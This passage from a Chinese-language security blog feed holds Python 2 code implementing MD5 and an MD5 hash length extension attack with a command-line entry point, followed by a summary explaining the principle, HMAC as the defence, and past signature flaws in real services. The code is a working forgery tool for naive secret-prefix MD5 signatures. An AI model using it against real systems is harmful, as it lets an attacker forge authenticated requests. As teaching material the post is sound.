class="params">(self)</span>:</span></div><div class="line">        self.A, self.B, self.C, self.D = (<span class="number">0x67452301L</span>, <span class="number">0xefcdab89L</span>, <span class="number">0x98badcfeL</span>, <span class="number">0x10325476L</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">md5_compress</span><span class="params">(self, buf)</span>:</span></div><div class="line">        <span class="keyword">if</span> len(buf) != <span class="number">64</span>:</div><div class="line">            <span class="keyword">raise</span> ValueError, <span class="string">"Invalid buffer of length %d: %s"</span> % (len(buf), repr(buf))</div><div class="line">        inp = struct.unpack(<span class="string">"I"</span>*<span class="number">16</span>, buf)</div><div class="line">        a, b, c, d = self.A, self.B, self.C, self.D</div><div class="line"></div><div class="line">        <span class="comment"># Round 1.</span></div><div class="line">        S11, S12, S13, S14 = <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span></div><div class="line"></div><div class="line">        a = XX(F, a, b, c, d, inp[<span class="number">0</span>], S11, <span class="number">0xD76AA478L</span>) <span class="comment"># 1</span></div><div class="line">        d = XX(F, d, a, b, c, inp[<span class="number">1</span>], S12, <span class="number">0xE8C7B756L</span>) <span class="comment"># 2</span></div><div class="line">        c = XX(F, c, d, a, b, inp[<span class="number">2</span>], S13, <span class="number">0x242070DBL</span>) <span class="comment"># 3</span></div><div class="line">        b = XX(F, b, c, d, a, inp[<span class="number">3</span>], S14, <span class="number">0xC1BDCEEEL</span>) <span class="comment"># 4</span></div><div class="line">        a = XX(F, a, b, c, d, inp[<span class="number">4</span>], S11, <span class="number">0xF57C0FAFL</span>) <span class="comment"># 5</span></div><div class="line">        d = XX(F, d, a, b, c, inp[<span class="number">5</span>], S12, <span class="number">0x4787C62AL</span>) <span class="comment"># 6</span></div><div class="line">        c = XX(F, c, d, a, b, inp[<span class="number">6</span>], S13, <span class="number">0xA8304613L</span>) <span class="comment"># 7</span></div><div class="line">        b = XX(F, b, c, d, a, inp[<span class="number">7</span>], S14, <span class="number">0xFD469501L</span>) <span class="comment"># 8</span></div><div class="line">        a = XX(F, a, b, c, d, inp[<span class="number">8</span>], S11, <span class="number">0x698098D8L</span>) <span class="comment"># 9</span></div><div class="line">        d = XX(F, d, a, b, c, inp[<span class="number">9</span>], S12, <span class="number">0x8B44F7AFL</span>) <span class="comment"># 10</span></div><div class="line">        c = XX(F, c, d, a, b, inp[<span class="number">10</span>], S13, <span class="number">0xFFFF5BB1L</span>) <span class="comment"># 11</span></div><div class="line">        b = XX(F, b, c, d, a, inp[<span class="number">11</span>], S14, <span class="number">0x895CD7BEL</span>) <span class="comment"># 12</span></div><div class="line">        a = XX(F, a, b, c, d, inp[<span class="number">12</span>], S11, <span class="number">0x6B901122L</span>) <span class="comment"># 13</span></div><div class="line">        d = XX(F, d, a, b, c, inp[<span class="number">13</span>], S12, <span class="number">0xFD987193L</span>) <span class="comment"># 14</span></div><div class="line">        c = XX(F, c, d, a, b, inp[<span class="number">14</span>], S13, <span class="number">0xA679438EL</span>) <span class="comment"># 15</span></div><div class="line">        b = XX(F, b, c, d, a, inp[<span class="number">15</span>], S14, <span class="number">0x49B40821L</span>) <span class="comment"># 16</span></div><div class="line"></div><div class="line">        <span class="comment"># Round 2.</span></div><div class="line">        S21, S22, S23, S24 = <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span></div><div class="line"></div><div class="line">        a = XX(G, a, b, c, d, inp[<span class="number">1</span>], S21, <span class="number">0xF61E2562L</span>) <span class="comment"># 17</span></div><div class="line">        d = XX(G, d, a, b, c, inp[<span class="number">6</span>], S22, <span class="number">0xC040B340L</span>) <span class="comment"># 18</span></div><div class="line">        c = XX(G, c, d, a, b, inp[<span class="number">11</span>], S23, <span class="number">0x265E5A51L</span>) <span class="comment"># 19</span></div><div class="line">        b = XX(G, b, c, d, a, inp[<span class="number">0</span>], S24, <span class="number">0xE9B6C7AAL</span>) <span class="comment"># 20</span></div><div class="line">        a = XX(G, a, b, c, d, inp[<span class="number">5</span>], S21, <span class="number">0xD62F105DL</span>) <span class="comment"># 21</span></div><div class="line">        d = XX(G, d, a, b, c, inp[<span class="number">10</span>], S22, <span class="number">0x02441453L</span>) <span class="comment"># 22</span></div><div class="line">        c = XX(G, c, d, a, b, inp[<span class="number">15</span>], S23, <span class="number">0xD8A1E681L</span>) <span class="comment"># 23</span></div><div class="line">        b = XX(G, b, c, d, a, inp[<span class="number">4</span>], S24, <span class="number">0xE7D3FBC8L</span>) <span class="comment"># 24</span></div><div class="line">        a = XX(G, a, b, c, d, inp[<span class="number">9</span>], S21, <span class="number">0x21E1CDE6L</span>) <span class="comment"># 25</span></div><div class="line">        d = XX(G, d, a, b, c, inp[<span class="number">14</span>], S22, <span class="number">0xC33707D6L</span>) <span class="comment"># 26</span></div><div class="line">        c = XX(G, c, d, a, b, inp[<span class="number">3</span>], S23, <span class="number">0xF4D50D87L</span>) <span class="comment"># 27</span></div><div class="line">        b = XX(G, b, c, d, a, inp[<span class="number">8</span>], S24, <span class="number">0x455A14EDL</span>) <span class="comment"># 28</span></div><div class="line">        a = XX(G, a, b, c, d, inp[<span class="number">13</span>], S21, <span class="number">0xA9E3E905L</span>) <span class="comment"># 29</span></div><div class="line">        d = XX(G, d, a, b, c, inp[<span class="number">2</span>], S22, <span class="number">0xFCEFA3F8L</span>) <span class="comment"># 30</span></div><div class="line">        c = XX(G, c, d, a, b, inp[<span class="number">7</span>], S23, <span class="number">0x676F02D9L</span>) <span class="comment"># 31</span></div><div class="line">        b = XX(G, b, c, d, a, inp[<span class="number">12</span>], S24, <span class="number">0x8D2A4C8AL</span>) <span class="comment"># 32</span></div><div class="line"></div><div class="line">        <span class="comment"># Round 3.</span></div><div class="line">        S31, S32, S33, S34 = <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span></div><div class="line"></div><div class="line">        a = XX(H, a, b, c, d, inp[<span class="number">5</span>], S31, <span class="number">0xFFFA3942L</span>) <span class="comment"># 33</span></div><div class="line">        d = XX(H, d, a, b, c, inp[<span class="number">8</span>], S32, <span class="number">0x8771F681L</span>) <span class="comment"># 34</span></div><div class="line">        c = XX(H, c, d, a, b, inp[<span class="number">11</span>], S33, <span class="number">0x6D9D6122L</span>) <span class="comment"># 35</span></div><div class="line">        b = XX(H, b, c, d, a, inp[<span class="number">14</span>], S34, <span class="number">0xFDE5380CL</span>) <span class="comment"># 36</span></div><div class="line">        a = XX(H, a, b, c, d, inp[<span class="number">1</span>], S31, <span class="number">0xA4BEEA44L</span>) <span class="comment"># 37</span></div><div class="line">        d = XX(H, d, a, b, c, inp[<span class="number">4</span>], S32, <span class="number">0x4BDECFA9L</span>) <span class="comment"># 38</span></div><div class="line">        c = XX(H, c, d, a, b, inp[<span class="number">7</span>], S33, <span class="number">0xF6BB4B60L</span>) <span class="comment"># 39</span></div><div class="line">        b = XX(H, b, c, d, a, inp[<span class="number">10</span>], S34, <span class="number">0xBEBFBC70L</span>) <span class="comment"># 40</span></div><div class="line">        a = XX(H, a, b, c, d, inp[<span class="number">13</span>], S31, <span class="number">0x289B7EC6L</span>) <span class="comment"># 41</span></div><div class="line">        d = XX(H, d, a, b, c, inp[<span class="number">0</span>], S32, <span class="number">0xEAA127FAL</span>) <span class="comment"># 42</span></div><div class="line">        c = XX(H, c, d, a, b, inp[<span class="number">3</span>], S33, <span class="number">0xD4EF3085L</span>) <span class="comment"># 43</span></div><div class="line">        b = XX(H, b, c, d, a, inp[<span class="number">6</span>], S34, <span class="number">0x04881D05L</span>) <span class="comment"># 44</span></div><div class="line">        a = XX(H, a, b, c, d, inp[<span class="number">9</span>], S31, <span class="number">0xD9D4D039L</span>) <span class="comment"># 45</span></div><div class="line">        d = XX(H, d, a, b, c, inp[<span class="number">12</span>], S32, <span class="number">0xE6DB99E5L</span>) <span class="comment"># 46</span></div><div class="line">        c = XX(H, c, d, a, b, inp[<span class="number">15</span>], S33, <span class="number">0x1FA27CF8L</span>) <span class="comment"># 47</span></div><div class="line">        b = XX(H, b, c, d, a, inp[<span class="number">2</span>], S34, <span class="number">0xC4AC5665L</span>) <span class="comment"># 48</span></div><div class="line"></div><div class="line">        <span class="comment"># Round 4.</span></div><div class="line">        S41, S42, S43, S44 = <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span></div><div class="line"></div><div class="line">        a = XX(I, a, b, c, d, inp[<span class="number">0</span>], S41, <span class="number">0xF4292244L</span>) <span class="comment"># 49</span></div><div class="line">        d = XX(I, d, a, b, c, inp[<span class="number">7</span>], S42, <span class="number">0x432AFF97L</span>) <span class="comment"># 50</span></div><div class="line">        c = XX(I, c, d, a, b, inp[<span class="number">14</span>], S43, <span class="number">0xAB9423A7L</span>) <span class="comment"># 51</span></div><div class="line">        b = XX(I, b, c, d, a, inp[<span class="number">5</span>], S44, <span class="number">0xFC93A039L</span>) <span class="comment"># 52</span></div><div class="line">        a = XX(I, a, b, c, d, inp[<span class="number">12</span>], S41, <span class="number">0x655B59C3L</span>) <span class="comment"># 53</span></div><div class="line">        d = XX(I, d, a, b, c, inp[<span class="number">3</span>], S42, <span class="number">0x8F0CCC92L</span>) <span class="comment"># 54</span></div><div class="line">        c = XX(I, c, d, a, b, inp[<span class="number">10</span>], S43, <span class="number">0xFFEFF47DL</span>) <span class="comment"># 55</span></div><div class="line">        b = XX(I, b, c, d, a, inp[<span class="number">1</span>], S44, <span class="number">0x85845DD1L</span>) <span class="comment"># 56</span></div><div class="line">        a = XX(I, a, b, c, d, inp[<span class="number">8</span>], S41, <span class="number">0x6FA87E4FL</span>) <span class="comment"># 57</span></div><div class="line">        d = XX(I, d, a, b, c, inp[<span class="number">15</span>], S42, <span class="number">0xFE2CE6E0L</span>) <span class="comment"># 58</span></div><div class="line">        c = XX(I, c, d, a, b, inp[<span class="number">6</span>], S43, <span class="number">0xA3014314L</span>) <span class="comment"># 59</span></div><div class="line">        b = XX(I, b, c, d, a, inp[<span class="number">13</span>], S44, <span class="number">0x4E0811A1L</span>) <span class="comment"># 60</span></div><div class="line">        a = XX(I, a, b, c, d, inp[<span class="number">4</span>], S41, <span class="number">0xF7537E82L</span>) <span class="comment"># 61</span></div><div class="line">        d = XX(I, d, a, b, c, inp[<span class="number">11</span>], S42, <span class="number">0xBD3AF235L</span>) <span class="comment"># 62</span></div><div class="line">        c = XX(I, c, d, a, b, inp[<span class="number">2</span>], S43, <span class="number">0x2AD7D2BBL</span>) <span class="comment"># 63</span></div><div class="line">        b = XX(I, b, c, d, a, inp[<span class="number">9</span>], S44, <span class="number">0xEB86D391L</span>) <span class="comment"># 64</span></div><div class="line"></div><div class="line">        self.A = (self.A + a) &amp; <span class="number">0xffffffffL</span></div><div class="line">        self.B = (self.B + b) &amp; <span class="number">0xffffffffL</span></div><div class="line">        self.C = (self.C + c) &amp; <span class="number">0xffffffffL</span></div><div class="line">        self.D = (self.D + d) &amp; <span class="number">0xffffffffL</span></div><div class="line">        <span class="comment"># print 'A=%s\nB=%s\nC=%s\nD=%s\n' % (hex(self.A), hex(self.B), hex(self.C), hex(self.D))</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(self, n, sz=None)</span>:</span></div><div class="line">        <span class="keyword">if</span> sz <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            sz = n</div><div class="line">        pre = <span class="number">64</span><span class="number">-8</span></div><div class="line">        sz = struct.pack(<span class="string">"Q"</span>,sz*<span class="number">8</span>)</div><div class="line">        pad = <span class="string">'\x80'</span></div><div class="line">        n += <span class="number">1</span></div><div class="line">        <span class="keyword">if</span> n % <span class="number">64</span> &lt;= pre:</div><div class="line">            pad += <span class="string">'\x00'</span> * (pre - n % <span class="number">64</span>)</div><div class="line">            pad += sz</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            pad += <span class="string">'\x00'</span> * (pre + <span class="number">64</span> - n % <span class="number">64</span>)</div><div class="line">            pad += sz</div><div class="line">        <span class="keyword">return</span> pad</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(self, msg)</span>:</span></div><div class="line">        <span class="keyword">return</span> msg + self.padding(len(msg))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">md5_iter</span><span class="params">(self, padding_msg)</span>:</span></div><div class="line">        <span class="keyword">assert</span> len(padding_msg) % <span class="number">64</span> == <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(padding_msg), <span class="number">64</span>):</div><div class="line">            block = padding_msg[i:i+<span class="number">64</span>]</div><div class="line">            self.md5_compress(padding_msg[i:i+<span class="number">64</span>])</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">digest</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIII'</span>, self.A, self.B, self.C, self.D)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hexdigest</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> binascii.hexlify(self.digest()).decode()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_md5</span><span class="params">(self, msg)</span>:</span></div><div class="line">        padding_msg = self.pad(msg)</div><div class="line">        self.md5_iter(padding_msg)</div><div class="line">        <span class="keyword">return</span> self.hexdigest()</div><div class="line"></div><div class="line">    <span class="comment"># 通过md5值，逆向算出最后一轮的magic number</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compute_magic_number</span><span class="params">(self, md5str)</span>:</span></div><div class="line">        self.A = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">0</span>:<span class="number">8</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</div><div class="line">        self.B = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">8</span>:<span class="number">16</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</div><div class="line">        self.C = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">16</span>:<span class="number">24</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</div><div class="line">        self.D = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">24</span>:<span class="number">32</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</div><div class="line">        <span class="comment">#print 'A=%s\nB=%s\nC=%s\nD=%s\n' % (hex(self.A), hex(self.B), hex(self.C), hex(self.D))</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extension_attack</span><span class="params">(self, md5str, str_append, lenth)</span>:</span></div><div class="line">        self.compute_magic_number(md5str)</div><div class="line">        p = self.padding(lenth)</div><div class="line">        padding_msg = self.padding( len(str_append), lenth + len(p) + len(str_append) )</div><div class="line">        self.md5_iter(str_append + padding_msg)</div><div class="line">        <span class="keyword">return</span> self.hexdigest()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    m = md5()</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</div><div class="line">    <span class="comment">#print m.my_md5("123456")</span></div><div class="line">        src = m.pad(sys.argv[<span class="number">1</span>]) + sys.argv[<span class="number">2</span>]</div><div class="line">        <span class="keyword">print</span> <span class="string">'md5 padding          -&gt;'</span>,m.my_md5(src)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'md5 extension_attack -&gt;'</span>,m.extension_attack(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], int(sys.argv[<span class="number">3</span>]))</div></pre></td></tr></table></figure>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个攻击方式的原理是，知道一个密文的md5和密文的长度，可以推算出密文与扩展消息拼接后的md5。防范方法也很简单：<br>方法1：用HMAC算法 HMAC(secret||padding)=H(secret||H(secret||padding))<br>方法2：交换secret和padding的位置，即MAC(padding||secret)</p>
-<p>通常md5可以作为签名来用，曾经有两个漏洞，亚马逊AWS和Flicker的签名漏洞，均可以通过md5哈希长度扩展攻击。最近也有一个phpwind的洞可用哈希长度扩展攻击。</p>
-<p>不过现在这个攻击方式的发展趋势应该是活在CTF中了233333</p>
-<h2 id="0x05-引用"><a href="#0x05-引用" class="headerlink" title="0x05 引用"></a>0x05 引用</h2><p><a href="http://www.ietf.org/rfc/rfc1321.txt" target="_blank" rel="external">http://www.ietf.org/rfc/rfc1321.txt</a><br><a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-27070210-id-3255947.html</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;Hash，一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;–摘自百度&lt;/p&gt;
-&lt;p&gt;哈希长度扩展攻击简单的来讲就是：&lt;br&gt;1.知道一个密文(SECRET)的哈希&lt;br&gt;2.知道密文的长度(SECRET LENGTH)&lt;br&gt;在不知道密文的情况下可以推算出密文+填充+追加消息(SECRET+PADDING+EXTRA)的哈希，也就是说在只知道密文长度和密文哈希的情况下，可以预测出密文和另一消息拼接后的哈希。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
-    
-    
-      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
